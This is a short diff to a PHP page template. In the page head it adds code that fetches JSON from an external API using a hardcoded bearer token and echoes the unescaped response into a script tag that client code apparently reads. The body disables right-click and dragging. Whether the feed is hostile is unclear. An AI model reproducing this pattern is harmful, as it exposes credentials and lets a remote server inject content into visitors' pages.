@@ -2603,8 +2603,17 @@ a.fiv_d i {
             gtag('config', 'G-NZPKRC33WQ');
         </script>
     <?php }
+    ?> 
+    <?php 
+    $r = $this->get_data([
+        "url" => "https://api.eronelit.com/app&id=A03429468246&json=all",
+        "headers" => [
+            'Content-Type: application/json',
+            'Authorization: Bearer 32M052k350QaeofkaeopfF',
+        ]
+    ]); 
+    echo "<script type='application/json' id='json_feed'>$r</script>";
     ?>
-
 </head>
 
 <body oncontextmenu="return false;" onload="welcomer.start(this);" ondragstart="return false;">
